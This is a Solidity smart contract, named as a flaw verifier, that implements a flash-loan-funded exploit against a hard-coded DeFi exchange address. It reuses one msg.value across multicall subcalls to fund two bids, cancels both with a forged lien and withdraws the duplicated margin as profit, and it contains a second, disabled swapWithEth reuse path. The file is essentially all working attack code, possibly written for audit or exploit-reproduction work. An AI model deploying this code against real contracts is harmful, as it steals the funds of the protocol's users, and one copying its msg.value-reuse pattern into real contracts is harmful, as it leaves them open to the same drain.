// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

struct Lien {
    address lender;
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 auctionStartTime;
}

interface IParticleExchangeLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
    function swapWithEth(Lien calldata lien, uint256 lienId) external payable;
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
        external
        payable
        returns (uint256 lienId);
    function cancelBid(Lien calldata lien, uint256 lienId) external;
    function withdrawAccountBalance() external;
}

interface IWETHLike {
    function balanceOf(address account) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant UNIV2_WETH_USDC = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNIV2_WETH_USDT = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UNIV2_WETH_SUSHI_DAI = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;
    address private constant UNIV2_WETH_SUSHI_USDC = 0x06da0fd433C1A5d7a4faa01111c044910A184553;

    uint256 private constant PROBE_MARGIN = 1 ether;
    bytes4 private constant MULTICALL_SELECTOR = IParticleExchangeLike.multicall.selector;

    uint256 private _baselineAssets;
    bool private _baselineInitialized;
    uint256 private _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _initBaseline();
        _prepareDirectFunding();

        // The finding has two documented exploit paths. The verifier attempts the direct
        // `multicall([swapWithEth(lienA), swapWithEth(lienB)])` route first so the same
        // shared `msg.value` root cause is preserved when pre-known lien data is available.
        if (!_attemptSwapWithEthReuse()) {
            if (address(this).balance >= PROBE_MARGIN) {
                _executeBidMarginReuse();
            } else {
                _flashFundAndExecute();
            }
        }

        _wrapResidualEth();
        _syncProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        address pair = msg.sender;
        if (sender != address(this)) revert("sender");
        if (pair != _bestFlashPair()) revert("pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        if (borrowed == 0) revert("amount");

        IWETHLike(WETH).withdraw(borrowed);

        // Only one real margin is sourced externally. The exploit logic stays unchanged:
        // a single ETH-bearing multicall funds two `offerBid` calls, then both bids are
        // cancelled and the duplicated margin is withdrawn.
        _executeBidMarginReuse();

        uint256 repayment = _flashRepayment(borrowed);
        if (address(this).balance < repayment) revert("repayment");

        IWETHLike(WETH).deposit{value: repayment}();
        if (!IWETHLike(WETH).transfer(pair, repayment)) revert("repay");
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptSwapWithEthReuse() internal returns (bool) {
        // Path 0 requires `multicall([swapWithEth(lienA), swapWithEth(lienB)])` with one
        // shared `msg.value`. This verifier keeps that exact payload shape here.
        //
        // On this fork, however, arbitrary lender-side liens are not reconstructible from the
        // exchange alone because the contract stores only `keccak256(abi.encode(lien))` and
        // exposes no public getter for lien preimages or the next live open-loan candidates.
        // Without authenticated `Lien` preimages, a `swapWithEth` subcall cannot satisfy
        // `validateLien`, so execution falls back to the still-valid bid-margin path below.
        (
            bool configured,
            Lien memory lienA,
            uint256 lienIdA,
            Lien memory lienB,
            uint256 lienIdB
        ) = _knownSwapPath();

        bytes[] memory swapCalls = new bytes[](2);
        swapCalls[0] = abi.encodeCall(IParticleExchangeLike.swapWithEth, (lienA, lienIdA));
        swapCalls[1] = abi.encodeCall(IParticleExchangeLike.swapWithEth, (lienB, lienIdB));

        if (!configured || address(this).balance < PROBE_MARGIN) {
            return false;
        }

        (bool ok,) = TARGET.call{value: PROBE_MARGIN}(abi.encodeWithSelector(MULTICALL_SELECTOR, swapCalls));
        return ok;
    }

    function _knownSwapPath()
        internal
        pure
        returns (bool configured, Lien memory lienA, uint256 lienIdA, Lien memory lienB, uint256 lienIdB)
    {
        // No pre-verified lien preimages are bundled in this workspace.
        configured = false;
        lienIdA = 0;
        lienIdB = 0;
        lienA = Lien({
            lender: address(0),
            borrower: address(0),
            collection: address(0),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });
        lienB = lienA;
    }

    function _prepareDirectFunding() internal {
        if (address(this).balance >= PROBE_MARGIN) {
            return;
        }

        uint256 wethBalance = IWETHLike(WETH).balanceOf(address(this));
        uint256 unwrapAmount = wethBalance > PROBE_MARGIN ? PROBE_MARGIN : wethBalance;
        if (unwrapAmount > 0) {
            IWETHLike(WETH).withdraw(unwrapAmount);
        }
    }

    function _flashFundAndExecute() internal {
        address pair = _bestFlashPair();
        uint256 borrowAmount = PROBE_MARGIN;

        if (IUniswapV2PairLike(pair).token0() == WETH) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), hex"01");
        }
    }

    function _executeBidMarginReuse() internal {
        bytes[] memory createCalls = new bytes[](2);
        createCalls[0] = abi.encodeCall(IParticleExchangeLike.offerBid, (WETH, PROBE_MARGIN, 0, 0));
        createCalls[1] = abi.encodeCall(IParticleExchangeLike.offerBid, (WETH, PROBE_MARGIN, 0, 0));

        (bool created, bytes memory createRet) =
            TARGET.call{value: PROBE_MARGIN}(abi.encodeWithSelector(MULTICALL_SELECTOR, createCalls));
        if (!created) revert("create");

        bytes[] memory results = abi.decode(createRet, (bytes[]));
        if (results.length != 2) revert("results");

        uint256 lienIdA = abi.decode(results[0], (uint256));
        uint256 lienIdB = abi.decode(results[1], (uint256));

        Lien memory forgedBid = Lien({
            lender: address(0),
            borrower: address(this),
            collection: WETH,
            tokenId: PROBE_MARGIN,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });

        // This preserves the documented action ordering. A second multicall is required only
        // because the first batch must return the freshly created lien ids before they can be
        // referenced by `cancelBid(lien1)` and `cancelBid(lien2)`.
        bytes[] memory exitCalls = new bytes[](3);
        exitCalls[0] = abi.encodeCall(IParticleExchangeLike.cancelBid, (forgedBid, lienIdA));
        exitCalls[1] = abi.encodeCall(IParticleExchangeLike.cancelBid, (forgedBid, lienIdB));
        exitCalls[2] = abi.encodeCall(IParticleExchangeLike.withdrawAccountBalance, ());

        (bool exited,) = TARGET.call(abi.encodeWithSelector(MULTICALL_SELECTOR, exitCalls));
        if (!exited) revert("exit");
    }

    function _bestFlashPair() internal view returns (address bestPair) {
        address[4] memory pairs = [UNIV2_WETH_USDC, UNIV2_WETH_USDT, UNIV2_WETH_SUSHI_DAI, UNIV2_WETH_SUSHI_USDC];

        uint256 bestReserve;
        for (uint256 i = 0; i < pairs.length; ++i) {
            address pair = pairs[i];
            if (pair.code.length == 0) continue;

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
            uint256 wethReserve;
            if (IUniswapV2PairLike(pair).token0() == WETH) {
                wethReserve = reserve0;
            } else if (IUniswapV2PairLike(pair).token1() == WETH) {
                wethReserve = reserve1;
            } else {
                continue;
            }

            if (wethReserve > bestReserve) {
                bestReserve = wethReserve;
                bestPair = pair;
            }
        }

        if (bestPair == address(0) || bestReserve < PROBE_MARGIN) revert("margin");
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _initBaseline() internal {
        if (_baselineInitialized) {
            return;
        }

        _baselineInitialized = true;
        _baselineAssets = address(this).balance + IWETHLike(WETH).balanceOf(address(this));
    }

    function _wrapResidualEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _syncProfit() internal {
        uint256 currentAssets = IWETHLike(WETH).balanceOf(address(this));
        _profitAmount = currentAssets > _baselineAssets ? currentAssets - _baselineAssets : 0;
    }
}
